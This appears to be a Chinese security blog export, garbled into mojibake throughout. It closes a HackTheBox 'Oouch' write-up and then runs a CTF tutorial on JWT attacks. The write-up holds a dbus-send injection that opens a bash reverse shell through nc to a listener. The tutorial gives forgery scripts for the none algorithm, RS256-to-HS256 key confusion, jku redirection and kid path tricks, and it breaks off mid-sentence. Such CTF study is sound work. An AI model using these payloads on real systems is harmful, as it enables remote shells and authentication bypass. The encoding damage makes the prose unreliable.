ç„¶åæœ¬æ¥åº”è¯¥å¾ˆå¿«è§£å†³çš„www-dataè·Ÿrooté€šä¿¡é—®é¢˜å›°æ‰°äº†æˆ‘å¥½ä¹…ã€‚é¦–å…ˆä¼ ä¸€ä¸ªncåˆ°dockeré‡Œé¢ç›‘å¬ï¼Œç„¶åç”¨åˆšåˆšdockerçš„www-dataçš„shellä¼ ä¸‹é¢è¿™ä¸ªpayload 1dbus-send --system --print-reply --dest&#x3D;htb.oouch.Block htb&#x2F;oouch&#x2F;Block htb.oouch.Block.Block &quot;string:; rm &#x2F;tmp&#x2F;f ; mkfifo &#x2F;tmp&#x2F;f; cat &#x2F;tmp&#x2F;f | &#x2F;bin&#x2F;bash -i 2&gt;&amp;1 | nc 172.18.0.3 6666 &gt;&#x2F;tmp&#x2F;f;&quot; æŒ‰ç†è¯´åº”è¯¥æˆçš„ï¼Œç»“æœå¡äº†å¥½ä¹…ã€‚ä¸ºæ­¤ç‰¹æ„ä¸Šç½‘æ‰¾wpç»“æœå‘ç°æ˜¯å‡ ä¹ä¸€æ ·çš„payloadã€‚åŠ ä¸Šæˆ‘åˆä¸æ‡‚dbusï¼Œæ‰€ä»¥å°±åªå¥½æç½®äº†ã€‚ç»“æœç¬¬äºŒå¤©å†è¯•äº†ä¸‹å°±æˆäº†â€¦â€¦ä¸çŸ¥é“æ˜¯ä¸æ˜¯å› ä¸ºæˆ‘ä¼ äº†ä¸ªoouchè‡ªå·±çš„ncåˆ°dockeré‡Œé¢çš„ç¼˜æ•…ã€‚æ€»ä¹‹å¤ªéº»çƒ¦äº†ï¼Œæ‰€ä»¥ä¸æƒ³å†å¤ç°äº†ã€‚ summaryè¿™å°é¶æœºä¸»è¦ä»·å€¼åœ¨äºå‰é¢get useréƒ¨åˆ†éå¸¸è´´è¿‘å®æˆ˜ã€‚æˆ‘è§‰å¾—æ˜¯æœ‰å¾ˆé«˜å­¦ä¹ ä»·å€¼çš„ã€‚å…³äºoauthçš„çŸ¥è¯†ä¹‹åæœ€å¥½å»äº†è§£ä¸‹ï¼Œå¯¹æˆæƒè¿™å—æœ¬åº”è¯¥å±äºé‡ç‚¹çš„å®‰å…¨é—®é¢˜èƒ½æœ‰æ–°çš„è®¤è¯†ã€‚","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"},{"name":"pentest","slug":"pentest","permalink":"https://www.bycsec.top/tags/pentest/"}]},{"title":"Make jwt great again","slug":"Make-jwt-great-again","date":"2020-06-24T13:03:40.000Z","updated":"2021-02-18T05:09:34.127Z","comments":true,"path":"2020/06/24/Make-jwt-great-again/","link":"","permalink":"https://www.bycsec.top/2020/06/24/Make-jwt-great-again/","excerpt":"jwtï¼Œå…¨ç§°json-web-token.å…¶å®‰å…¨é—®é¢˜ä¸€ç›´ä»¥æ¥ä¼—æ‰€å‘¨çŸ¥ã€‚CTFä¸­ä¹Ÿç»å¸¸æ€§çš„ä¼šå‡ºç°ç›¸å…³çš„jwtä¼ªé€ çš„é¢˜ç›®ã€‚ä½†æ˜¯ä¹‹å‰åœ¨æ‰“äº†åœºNahamconCTFçš„æ¯”èµ›åï¼Œå¯¹jwtåˆæœ‰äº†å…¨æ–°çš„è®¤è¯†ã€‚å› æ­¤åœ¨è¿™é‡Œå…¨é¢çš„è§£é‡Šä¸‹jwtçš„ç›¸å…³æ¼æ´ã€‚Letâ€™s make jwt great again :)","text":"jwtï¼Œå…¨ç§°json-web-token.å…¶å®‰å…¨é—®é¢˜ä¸€ç›´ä»¥æ¥ä¼—æ‰€å‘¨çŸ¥ã€‚CTFä¸­ä¹Ÿç»å¸¸æ€§çš„ä¼šå‡ºç°ç›¸å…³çš„jwtä¼ªé€ çš„é¢˜ç›®ã€‚ä½†æ˜¯ä¹‹å‰åœ¨æ‰“äº†åœºNahamconCTFçš„æ¯”èµ›åï¼Œå¯¹jwtåˆæœ‰äº†å…¨æ–°çš„è®¤è¯†ã€‚å› æ­¤åœ¨è¿™é‡Œå…¨é¢çš„è§£é‡Šä¸‹jwtçš„ç›¸å…³æ¼æ´ã€‚Letâ€™s make jwt great again :) jwt JWTçš„å…¨ç§° Json Web Tokenã€‚å®ƒéµå¾ªJSONæ ¼å¼ï¼Œå°†ç”¨æˆ·ä¿¡æ¯åŠ å¯†åˆ°tokené‡Œï¼ŒæœåŠ¡å™¨ä¸ä¿å­˜ä»»ä½•ç”¨æˆ·ä¿¡æ¯ï¼Œåªä¿å­˜å¯†é’¥ä¿¡æ¯ï¼Œé€šè¿‡ä½¿ç”¨ç‰¹å®šåŠ å¯†ç®—æ³•éªŒè¯tokenï¼Œé€šè¿‡tokenéªŒè¯ç”¨æˆ·èº«ä»½ã€‚åŸºäºtokençš„èº«ä»½éªŒè¯å¯ä»¥æ›¿ä»£ä¼ ç»Ÿçš„cookie+sessionèº«ä»½éªŒè¯æ–¹æ³• å…¶æ ¼å¼ä¹Ÿéå¸¸æ¸…æ™°header.payload.signatureç”±ä¸‰æ®µå¼ç»„æˆã€‚ è¿™é‡Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œflaskçš„sessionç”Ÿæˆæ ¼å¼ä¹ŸåŒæ ·æ˜¯ä¸‰æ®µå¼ã€‚æœ‰ä¸€å®šçš„å¼‚æ›²åŒå·¥ä¹‹å¤„ã€‚ä½†æ˜¯ä¸åŒäºjwtã€‚å…¶ä¼ªé€ æ–¹å¼å¾€å¾€éå¸¸å±€é™ã€‚ ä¸‹é¢ç®€å•è°ˆä¸‹ä¸‰ä¸ªéƒ¨åˆ†ç»“æ„ headerä¸€ä¸ªç®€å•çš„headeræ˜¯è¿™ç§å½¢å¼çš„1234&#123; \"alg\" : \"HS256\", \"typ\" : \"jwt\"&#125; ä½†æ˜¯å®é™…ä¸Šjwtçš„headerè¿˜æ”¯æŒåŠ å…¥å…¶å®ƒå‡ ä¸ªå±æ€§ã€‚kid,jwk......å…¶å…·ä½“å«ä¹‰å°†åœ¨åé¢æåŠã€‚ payload123456789&#123; \"user_role\" : \"finn\", //å½“å‰ç™»å½•ç”¨æˆ· \"iss\": \"admin\", //è¯¥JWTçš„ç­¾å‘è€… \"iat\": 1573440582, //ç­¾å‘æ—¶é—´ \"exp\": 1573940267, //è¿‡æœŸæ—¶é—´ \"nbf\": 1573440582, //è¯¥æ—¶é—´ä¹‹å‰ä¸æ¥æ”¶å¤„ç†è¯¥Token \"domain\": \"example.com\", //é¢å‘çš„ç”¨æˆ· \"jti\": \"dff4214121e83057655e10bd9751d657\" //Tokenå”¯ä¸€æ ‡è¯†&#125; å…¶ä¸­å¤§éƒ¨åˆ†å˜é‡éƒ½æ˜¯å¯ä»¥é€‰æ‹©æ€§ç”Ÿæˆçš„ã€‚æœ‰çš„è¯­è¨€çš„jwtåº“ä¼šè‡ªåŠ¨ç”Ÿæˆiatå˜é‡ï¼Œä½†æ˜¯è¿™äº›éƒ½æ— ä¼¤å¤§é›…ã€‚å¾€å¾€æœ€é‡è¦çš„ï¼Œæ˜¯å½“payloadå­˜å‚¨äº†è‡ªå®šä¹‰çš„æ•æ„Ÿä¿¡æ¯æ—¶ã€‚æ¯”å¦‚usernameä¹‹ç±»çš„ã€‚ ç”±äºjwtå­˜å‚¨ä¿¡æ¯æ—¶ï¼Œheader+payloadçš„jsonæ•°æ®æ˜¯ç›´æ¥é€šè¿‡base64è¿›è¡Œç¼–ç å­˜å‚¨çš„ã€‚å› æ­¤æˆ‘ä»¬ä¸€å®šå¯ä»¥ä»payloadä¸­å‘ç°ä¿¡æ¯æ³„éœ²ã€‚ ä½†æ˜¯ä»æ¼æ´åˆ©ç”¨è§’åº¦æ¥è®²ï¼Œæˆ‘ä»¬å¦‚æœæƒ³è¦è¾¾æˆè¶Šæƒçš„ç›®çš„ï¼Œå°±å¿…é¡»å¾—æåˆ°å…¶signatureéƒ¨åˆ†ã€‚ Signature é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯é€šè¿‡å‰é¢æŒ‡å®šçš„ç®—æ³•ï¼Œå»ç”Ÿæˆå¯¹åº”çš„sig.è¿™é‡Œæˆ‘ä»¥HS256ä¸ºä¾‹ï¼Œä»ä¼ªä»£ç çš„è§’åº¦è®²ã€‚æ˜¯è¿™æ ·ç”Ÿæˆçš„ 123key = 'secretkey' unsignedToken = encodeBase64(header) + '.' + encodeBase64(payload) signature = HMAC-SHA256(key, unsignedToken) å¯è§ï¼Œå…¶æ€è·¯å°±æ˜¯ç”¨HMAC-sha256ï¼ˆå¯¹ç§°åŠ å¯†ç®—æ³•ï¼‰ï¼Œå¯¹jwtå‰ä¸¤ä¸ªéƒ¨åˆ†ç»„æˆçš„å­—ç¬¦ä¸²è¿›è¡ŒåŠ å¯†ã€‚ ä½†æ˜¯å®é™…ä¸Šï¼Œå¤§å®¶å¯èƒ½æ³¨æ„åˆ°è¿‡ä¸€ä¸ªç°è±¡ï¼šjwtä¸­æ²¡æœ‰/,=è¿™ç§æœ¬è¯¥å‡ºç°åœ¨base64æ•°æ®ä¸­çš„å­—ç¬¦ã€‚è€Œåœ¨ä¹‹å‰æåˆ°è¿‡çš„æ¯”èµ›ä¸­ï¼Œæˆ‘ä¹Ÿæ˜¯é‡åˆ°äº†è¿™ä¸ªé—®é¢˜ï¼Œå¹¶é€šè¿‡æ‰¾è§„å¾‹å‘ç°ï¼Œjwtæœ€ç»ˆçš„ç»“æœä¼šå°†åŸå§‹çš„base64å­—ç¬¦ä¸²ä¸­çš„/æ¢æˆ_ã€‚å¹¶ä¸”å»æ‰åŸæœ¬base64ä¸­ç”¨äºè¡¥ä½çš„=ã€‚ å®é™…ä¸Šï¼Œè¿™ç‚¹æˆ‘ä»¬å¯ä»¥ç”¨pythonçš„åº“ä¸­base64.urlsafe_b64encodeæ›¿æ¢base64encode.ä¹Ÿå› æ­¤å¯ä»¥ç†è§£ï¼Œæ˜¯ä¸ºäº†ç½‘ç»œä¼ è¾“æ‰å¯¹è¿™å‡ ä¸ªç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†å¤„ç†ã€‚ è‡³äºå¦ä¸€ç§å¸¸è§çš„RS256ç®—æ³•ä¹Ÿæ˜¯ç›¸åŒçš„é“ç†ã€‚æœåŠ¡ç«¯éœ€è¦å­˜å‚¨ä¸€ç»„publickey.pemä¸privatekey.pem.æˆ‘ä»¬éœ€è¦ç§é’¥ç”Ÿæˆtoken.æœåŠ¡ç«¯åˆ™ä¼šç”¨å…¬é’¥è§£å¯†tokenã€‚ exploitsæ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•åˆ©ç”¨æ¼æ´æ¸—é€jwtäº†ã€‚é¦–å…ˆéœ€è¦æ˜ç¡®ä¸¤ç‚¹ æ˜¯å¦éœ€è¦åˆ©ç”¨jwtï¼Ÿ æ˜¯å¦æœ‰å…¶ä»–æ¼æ´æ³„éœ²key? ä¹‹æ‰€ä»¥æåˆ°è¿™ä¸¤ç‚¹æ˜¯å› ä¸ºï¼šjwtæœ¬èº«å°±æ˜¯å› ä¸ºåªç”¨æœåŠ¡ç«¯å­˜å‚¨ä¸€ç»„keyæ¥å‡è½»å‹åŠ›è€Œè¯ç”Ÿçš„ã€‚æ˜¯å¯ä»¥ä½œä¸ºsessionidçš„æ›¿æ¢æ–¹æ¡ˆçš„ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸»æµçš„ç¼–ç¨‹è¯­è¨€python,java,Node.jséƒ½å¯ä»¥å¾ˆè½»æ¾çš„è°ƒç”¨jwt.å…¶ä»–è¯­è¨€å¦‚phpä¹Ÿæ”¯æŒã€‚è€ŒçœŸå®æƒ…å†µå¾€å¾€æ˜¯ä»–ä»¬è°ƒç”¨jwtæ¥å­˜å‚¨å¿…è¦çš„ç®€å•ç”¨æˆ·ä¿¡æ¯ï¼Œæ‰€ä»¥ä¸è¦è®¤ä¸ºjwtä¸€å®šæœ‰æ¼æ´å¯åˆ©ç”¨ åŒæ—¶ï¼Œjwtçš„keyä¹Ÿæ˜¯éå¸¸å¤´ç–¼çš„ä¸€ä¸ªè¯é¢˜ã€‚å¦‚æœéœ€è¦è¶Šæƒï¼Œé‚£ä¹ˆå°±éœ€è¦ä¼ªé€ token.è€Œä¼ªé€ å¿…é¡»éœ€è¦keyæ¥ç­¾åï¼ˆæˆ–è€…æœåŠ¡ç«¯è„šæœ¬æ¼æ´ï¼‰ã€‚ä¹Ÿè®¸æ˜¯å—äº†å›½èµ›å½±å“ï¼Œjwtçš„keyæ˜¯ç”¨c-jwt-crackeræš´ç ´çš„.è€Œå®é™…æƒ…å†µä¸‹ï¼Œkeyå¾ˆæœ‰å¯èƒ½éš¾ä»¥çˆ†ç ´ï¼Œæ‰€ä»¥æˆ‘è®¤ä¸ºæœ€ä½³æ–¹æ¡ˆæ˜¯å…ˆå»å¯»æ‰¾å¯èƒ½æ³„éœ²keyçš„æ–¹æ³•ã€‚ æ¯”å¦‚æŸæ¯”èµ›æˆ‘åœ¨getshellåï¼Œæ‰’ä¸‹æºç æ—¶é¡ºæ‰‹çœ‹äº†ä¸€çœ¼å®ƒæœåŠ¡ç«¯çš„keyï¼Œæ ¹æœ¬ä¸å¯èƒ½çˆ†ç ´ æ‰€ä»¥ï¼Œå°è¯•å…¶ä»–æ–¹å¼æ¥è·å–keyã€‚è¿™ä¹Ÿæ­£æ˜¯æˆ‘ä¸‹é¢è¦æ€»ç»“çš„ï¼Œç”¨äºjwtçš„æ¼æ´åˆ©ç”¨ã€‚ ä¿¡æ¯æ³„éœ²-ä¼ªé€ å¿…å¤‡ç½‘ç«™ï¼šhttp://jwt.io/è¿™ä¹Ÿæ˜¯æ‰€æœ‰jwté¢˜ç›®ç¬¬ä¸€æ­¥å°±è¯¥åšçš„ã€‚å› ä¸ºå³ä½¿æ²¡æœ‰keyï¼Œæˆ‘ä»¬ä¹Ÿèƒ½æ¸…æ™°çš„å¾—åˆ°æ‰€æœ‰headerä¸payloadçš„ä¿¡æ¯ã€‚è€Œå¾€å¾€è¿™å†³å®šäº†æˆ‘ä»¬ä¸‹ä¸€æ­¥çš„ä¸¾æªã€‚ æ¯”å¦‚ï¼Œpayloadä¸­æœ‰usernameå­—æ®µã€‚é‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦å¯ä»¥ä¼ªé€ adminæ¥è¿›è¡Œæƒé™æå‡å‘¢ï¼Ÿæˆ–è€…ï¼Œåº”ç”¨æœ‰æŸä¸ªå˜é‡å­—æ®µå–è‡ªjwt,é‚£ä¹ˆæˆ‘ä»¬å¦‚æœæœ‰äº†key.å°±å¯ä»¥ä½¿ç”¨jwt.ioæˆ–è€…pythonè„šæœ¬è¿›è¡Œä¼ªé€ äº†ã€‚ ä»¥ä»Šå¹´ç½‘é¼ç„æ­¦ç»„çš„js_onä¸ºä¾‹ã€‚å½“ä»¥å¼±å£ä»¤ç™»å½•adminæ—¶ï¼Œå°±å¯ä»¥å¾—åˆ°keyã€‚ä»è€Œä»»æ„æ”¹é€ å­˜åœ¨sqlæ³¨å…¥çš„å­—æ®µè¿›è¡Œç›²æ³¨ã€‚è¿™ä¹Ÿå°±è¦æ±‚æˆ‘ä»¬ä½¿ç”¨è„šæœ¬æ¥å®Œæˆæ”»å‡»ã€‚ä¸‹é¢ç»™å‡ºä¸€ä¸ªpythonè°ƒç”¨jwtåŸºæœ¬ç”¨æ³• 1234import jwtencoded_jwt = jwt.encode(&#123;'user_name': 'admin'&#125;, 'secretkey', algorithm='HS256').decode('utf-8')print(encoded_jwt) æ³¨æ„pythonè°ƒç”¨jwtçš„åº“æ˜¯PyJwtã€‚å¹¶ä¸”è¿˜æœ‰ä¸€ä¸ªå‘ç‚¹æ˜¯ï¼Œpythonæƒ³è¦ç”¨ç§é’¥ä½œä¸ºkeyï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨RS256ç®—æ³•åŠ å¯†æ—¶ä¼šæŠ¥é”™ã€‚ä¸çŸ¥é“æ˜¯å¦åªæœ‰æˆ‘å‡ºç°è¿™ä¸ªé—®é¢˜ã€‚å› æ­¤è¿˜æ˜¯å¾—ç”¨jwt.ioè§£å†³ None-algorithmjwtæ”¯æŒç©ºç®—æ³•ï¼Œä¹Ÿå°±æ˜¯Noneã€‚åŸæœ¬åªæ˜¯ä¸ºäº†è°ƒè¯•ç”¨çš„ï¼Œä½†è¿™ä¸€æ—¦å‡ºç°åœ¨äº†æºç ä¸­å°†æ˜¯éå¸¸è‡´å‘½çš„ã€‚ æ¯”å¦‚ä¹‹å‰è™ç¬¦æ¯”èµ›çš„é¢˜ç›®ã€‚åº”è¯¥æ˜¯å€Ÿé‰´äº†å¤–å›½èµ›çš„ä¸€ä¸ªé¢˜ã€‚å…¶æºç æ˜¯è¿™æ ·çš„ 123456let sid = JSON.parse(Buffer.from(cookie.split(\".\")[1], 'base64').toString()).secretid;if(sid==undefined||sid&gt;=secrets.length||sid&lt;0)&#123;throw \"invalid sid\"&#125;let decoded = jwt.verify(cookie, secrets[sid]);if(decoded.perms==\"admin\")&#123; res.locals.flag = true;&#125; å¯ä»¥å‘ç°ï¼Œå½“æ²¡æœ‰å¼ºè°ƒç®—æ³•ï¼Œç›´æ¥ä½¿ç”¨jwt.verify()æ—¶ï¼Œç”±äºkeyå¯æ§ï¼Œjwtæ˜¯å¯ä»¥ç”¨Noneç®—æ³•æ¥è§£tokençš„ã€‚è¿™ä¹Ÿå°±å¯¼è‡´äº†ç®€å•çš„è¶Šæƒã€‚åŒç†ã€‚pythonçš„æºç å¦‚æœæ²¡æœ‰å¼ºè°ƒï¼Œä¹Ÿæ˜¯å­˜åœ¨ç©ºç®—æ³•ä¼ªé€ çš„ã€‚æ‰€ä»¥æœ‰æ—¶å€™ä¸å¦¨å°è¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹æ— ç®—æ³•èƒ½ä¸èƒ½é€šè¿‡æœåŠ¡ç«¯æ ¡éªŒï¼ˆæ²¡æœ‰æºç æ—¶ï¼‰ é€šå¸¸æ­¥éª¤å¦‚ä¸‹ 1234567import jwtjwtToken= 'eyJhbGciOiJIUzI1NiIsI...'decodedToken= jwt.decode(jwtToken, verify=False) # Need to decode the token before encoding with type 'None'noneEncoded= jwt.encode(decodedToken, key='', algorithm=None)print(noneEncoded.decode()) RS256 to HS256ä»éå¯¹ç§°åˆ°å¯¹ç§°ç®—æ³•çš„ä¼ªé€ ã€‚å…¶å®éå¸¸æœ‰æ„æ€ä½†æ˜¯å›½å†…CTFéƒ½æ²¡æ€ä¹ˆè§åˆ°è¿‡ã€‚ ç›´æ¥ä¸ŠçœŸé¢˜æºç ï¼Œåº”è¯¥æ˜¯ä¹‹å‰HSCTFé‡Œé¢çš„ 12345#ç”Ÿæˆtokenauth = jwt.encode(&#123;\"auth\": \"guest\"&#125;, PRIVATE_KEY, algorithm=\"RS256\")#ç”¨tokenéªŒè¯èº«ä»½æ˜¯å¦ä¸ºadminadmin = jwt.decode(auth, PUBLIC_KEY)[\"auth\"] == \"admin\" ä¹ä¸€çœ‹æ²¡ä»€ä¹ˆæ¼æ´ã€‚ä½†æ˜¯å¦‚æœäº†è§£jwtï¼Œå°±ä¼šå‘ç°è¿™é‡Œå¯èƒ½å­˜åœ¨ä½¿ç”¨HS256æ›¿æ¢RS256çš„é£é™©ã€‚å‡å¦‚å…¬é’¥æ³„éœ²ï¼Œæˆ‘ä»¬å°±èƒ½ç”¨å…¬é’¥ä½œä¸ºkeyï¼Œä½¿ç”¨HS256ç”Ÿæˆtokené€šè¿‡æ ¡éªŒã€‚è¿™åŒæ ·æ˜¯æ²¡æœ‰å¼ºè°ƒç®—æ³•çš„é—®é¢˜ã€‚ ä¼ªé€ çš„è¯å¯ä»¥ç”¨python 1234import jwtpublic = open('public.pem', 'r').read()print(public)print(jwt.encode(&#123;\"data\":\"test\"&#125;, key=public, algorithm='HS256')).decode('utf-8') ä½†éœ€è¦æ³¨æ„ï¼Œè¿™é‡Œå¿…é¡»æ»¡è¶³pyjwt==0.4.3æ‰èƒ½ä¼ªé€ ã€‚å¦åˆ™åªèƒ½é‡‡ç”¨å…¶ä»–åŠæ³•äº†ã€‚è¿™é‡Œç›´æ¥ç»™å‡ºpayloadallthethingsé‡Œçš„é“¾æ¥https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token#jwt-signatureâ€”rs256-to-hs256 è€ŒNode.jsä¹Ÿå­˜åœ¨è¿™ç§é£é™©ã€‚æ‰€ä»¥è¯´jwtçš„å®‰å…¨é—®é¢˜ä¸»è¦å‡ºåœ¨å¼€å‘è€…æºç å†™çš„ä¸å¤Ÿå¥½çš„åŸå› ã€‚ jku/jwkä»¥ä¸Šéƒ½æ˜¯ç›¸å¯¹æ¯”è¾ƒå¸¸è§çš„æ¼æ´äº†ã€‚ç”šè‡³å›½å†…ctfè¿˜åªå‡ºç°è¿‡å‰ä¸¤ç§ã€‚è€ŒNahamconçš„æ¯”èµ›è®©æˆ‘äº†è§£åˆ°äº†å¦ä¸€ç§å­˜åœ¨çš„æ¼æ´ã€‚ä¸jkuç›¸å…³ã€‚ JKUå…¨ç§°æ˜¯â€œJWKSet URLâ€ï¼Œå®ƒæ˜¯å¤´éƒ¨çš„ä¸€ä¸ªå¯é€‰å­—æ®µï¼Œç”¨äºæŒ‡å®šé“¾æ¥åˆ°ä¸€ç»„åŠ å¯†tokenå¯†é’¥çš„URLã€‚è‹¥å…è®¸ä½¿ç”¨è¯¥å­—æ®µä¸”ä¸è®¾ç½®é™å®šæ¡ä»¶ï¼Œæ”»å‡»è€…å°±èƒ½æ‰˜ç®¡è‡ªå·±çš„å¯†é’¥æ–‡ä»¶ï¼Œå¹¶æŒ‡å®šåº”ç”¨ç¨‹åºï¼Œç”¨å®ƒæ¥è®¤è¯tokenã€‚ è€Œjwkå°±æ˜¯json web keyã€‚ å®é™…ä¸Šä½ èƒ½å‘ç°amazonå°±æœ‰ç›¸å…³çš„æ–‡æ¡£æ¥äº†è§£jkuã€‚https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/amazon-cognito-user-pools-using-tokens-verifying-a-jwt.html å…¶ä¸­è¿˜æåˆ°äº†kidè¿™ä¸ªheaderé€‰é¡¹ã€‚å®ƒçš„ä½œç”¨æ˜¯è·å–å¯¹åº”çš„å­—æ®µä½œä¸ºkeyã€‚(jwkç±»å‹) ä¸‹é¢æˆ‘ç”¨æ¯”èµ›ä¸­flagjokesè¿™é¢˜æ¥è®²è§£ä¸‹ï¼š é¦–å…ˆè§£å‡ºjwt headerå¦‚ä¸‹ï¼Œè€Œæˆ‘ä»¬åªè¦payloadä¸­çš„usernameä¸ºadminå³å¯è·å¾—flagã€‚ 12345&#123; &quot;alg&quot;: &quot;RS256&quot;, &quot;jku&quot;: &quot;http:&#x2F;&#x2F;localhost:5000&#x2F;static&#x2F;jwks.json&quot;, &quot;kid&quot;: &quot;sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc&quot;&#125; jkuæŒ‡å‘äº†æœ¬åœ°çš„ç½‘é¡µã€‚é‚£ä¹ˆå°è¯•ç›´æ¥è®¿é—®å‘ç°ç½‘é¡µå­˜åœ¨static/jwks.json 123456789101112&#123; &quot;keys&quot;: [ &#123; &quot;e&quot;: &quot;AQAB&quot;, &quot;kid&quot;: &quot;sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc&quot;, &quot;kty&quot;: &quot;RSA&quot;, &quot;n&quot;: &quot;1bVdpTILcGSahuOL6IJCbUpDZTGFHc8lzQORNLQBXDiRd1cC1k5cG41iR1TYh74cp8HYmoLXy4U2bp7GUFm0ip_qzCxcabUwWCxF07TGsmiFmCUbcQ6vbJvnSZSZGe-RFPgHxrVzHgQzepNIY2TmjgXyqt8HNuKBJQ6NoTviyxZUqy65KtSBfLYh5XzFn3FPemOla8kGBu7moSbUpgO1t3m3LgxBV5y51E1xSSoC7nAYPFrQ9wOTHEh7kGxGUQqKtGswyi2ncH22VcfQkxMA0HerFMPOr2n9eEZEbeJFco9Gp3drAYDCyj0QbkJKGdbl_50cimZ7eXgeyc3lEEXL7Q&quot;&#125; ]&#125; æ­¤æ—¶æˆ‘å‘ç°å¾—åˆ°jwkåï¼Œå³å¯ç”Ÿæˆå…¬é’¥äº†ã€‚ä½†æ˜¯ç½‘ç«™åªæ³„éœ²äº†å…¬é’¥ï¼Œé‚£ä¹ˆæ ¹æ®ä¸Šé¢æ€»ç»“çš„ï¼Œèƒ½å°è¯•çš„åªèƒ½æ˜¯HS256æ›¿æ¢RS256ç”Ÿæˆtoken.ç„¶è€Œå½“æ—¶å°è¯•äº†åå´å¾—åˆ°æœåŠ¡ç«¯çš„æŠ¥é”™ã€‚ä¹Ÿå°±æ˜¯è¯´å¹¶ä¸èƒ½æ›´æ¢ç®—æ³•æ¥ä¼ªé€ token.é‚£ä¹ˆæ€ä¹ˆåŠå‘¢ï¼Ÿ æ­¤æ—¶é€šè¿‡æŸ¥è¯¢ä¸€ç³»åˆ—èµ„æ–™ï¼Œç»ˆäºå‘ç°jkuçš„æŒ‡å®šæ˜¯æœ‰æ´çš„ã€‚å‡å¦‚æˆ‘ä»¬è®©å®ƒåŠ è½½åˆ°æˆ‘ä»¬è‡ªå·±çš„jwk.jsonï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿä»¥RS256ç®—æ³•è€Œä¸æ˜¯ä¼ªé€ HS256é€šè¿‡æ ¡éªŒäº†ã€‚ æ‰€ä»¥ï¼Œæ­£ç¡®æ€è·¯æ˜¯ç”³è¯·ä¸€ç»„keyï¼Œkidå¯ä»¥è‡ªå®šhttps://mkjwk.org/æˆ‘ä»¬å¯ä»¥åªæ”¾ä¸­é—´çš„ä½œä¸ºjwk.jsonï¼Œä¹Ÿå¯ä»¥æŠŠå³è¾¹çš„å…¬é’¥æ”¹æˆjwkçš„æ ¼å¼ã€‚ ä¹‹åå°±æ˜¯åœ¨çº¿æˆ–è€…ç”¨è„šæœ¬è¿›è¡Œjwk-&gt;pemçš„è½¬æ¢äº†ã€‚è¿™é‡Œè´´å‡ºä¸€ä¸ªNode.jsè¿›è¡Œè½¬æ¢çš„è„šæœ¬ã€‚ 12345678910111213const jose = require('node-jose');const fs = require('fs');const args = process.argv.slice(2);const key = fs.readFileSync(args[0]);var DUMP_PRIVATE_KEY = ('true' == args[1]);jose.JWK.asKey(key) .then(function(key) &#123; console.log(key.toPEM(DUMP_PRIVATE_KEY)); &#125;); ä½¿ç”¨æ—¶ å‘ç°node test.js private.jwkè·Ÿ public.jwkä¸€è‡´ï¼Œè¯æ˜æ²¡æœ‰é—®é¢˜ã€‚æ­¤æ—¶åªéœ€ä½¿ç”¨node test.js private.jwk TRUEå³å¯è¾“å‡ºç§é’¥ç»“æœï¼Œå¦åˆ™è„šæœ¬è®¾è®¡ä¸Šæ˜¯é»˜è®¤ä¸è¾“å‡ºç§é’¥çš„ï¼ˆå±é™©ï¼‰ã€‚ å› æ­¤ã€‚æœ¬é¢˜å…³é”®æ˜¯æ›´æ”¹jkuè·å–åˆ°æˆ‘ä»¬è‡ªå·±çš„jsonã€‚è¿™æ ·æˆ‘ä»¬å¯ä»¥ç”¨ç§é’¥åŠ å¯†payload.æœåŠ¡ç«¯ç”¨è·å–åˆ°çš„å…¬é’¥è§£å¯†payload. kid-ä»»æ„æ–‡ä»¶kidçš„å«ä¹‰ä¸Šé¢å·²ç»æåˆ°è¿‡äº†ï¼šæŒ‡å®šjwtçš„å¯†é’¥ã€‚ kidå¯èƒ½å­˜åœ¨çš„é—®é¢˜ï¼Œåœ¨äº†è§£äº†ä¸Šé¢jkuçš„ç›¸å…³æ¼æ´åï¼Œåº”è¯¥ä¼šæ¯”è¾ƒæ¸…æ¥šäº†ã€‚å¦‚æœjwtæ˜¯é€šè¿‡headerä¸­çš„kidæ¥è·å–keyï¼Œé‚£ä¹ˆå°±å¯èƒ½é€ æˆä»»æ„æ–‡ä»¶è¯»å–ï¼ˆä¸ä¸€å®šæœ‰å›æ˜¾ï¼‰ ç®€å•çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æŒ‡å®škidä¸º2ï¼Œå³HS256çš„secretkeyä¸º2 12345&#123; \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"2\"&#125; æˆ–è€…æœ‰çš„æ—¶å€™å®ƒæ˜¯ä»æ–‡ä»¶è·å–çš„ 1&quot;kid&quot; : &quot;&#x2F;etc&#x2F;passwd&quot; å‡å¦‚æœ‰webåº”ç”¨æŠŠå¯†é’¥å›æ˜¾å‡ºæ¥ï¼ˆä¸å¤ªå¯èƒ½ï¼‰ï¼Œå³å¯è¯»å–æ–‡ä»¶ã€‚åŒæ—¶è¿˜æœ‰ä¸€ç§æ€è·¯ã€‚ç”±äºå¯ä»¥æŒ‡å®šä»»æ„æ–‡ä»¶ï¼Œåªè¦æ‰¾åˆ°å¯æ§çš„keyã€‚æˆ‘ä»¬å°±èƒ½åšåˆ°ä¼ªé€ jwttokenã€‚ æ¯”å¦‚æŒ‡å®šé™æ€cssæ–‡ä»¶ï¼Œå®ƒçš„æ–‡ä»¶å†…å®¹ä¸€å®šæ˜¯å¯æ§çš„ï¼Œä¸”æ˜“äºä»ç½‘é¡µè·å–çš„ã€‚ 1&quot;kid&quot; : &quot;&#x2F;css&#x2F;public.css&quot; ä¸‹é¢å°±NahamconCTFçš„Bâ€™omarr Styleæ¥åˆ†æä¸‹è¿™é¢˜å› 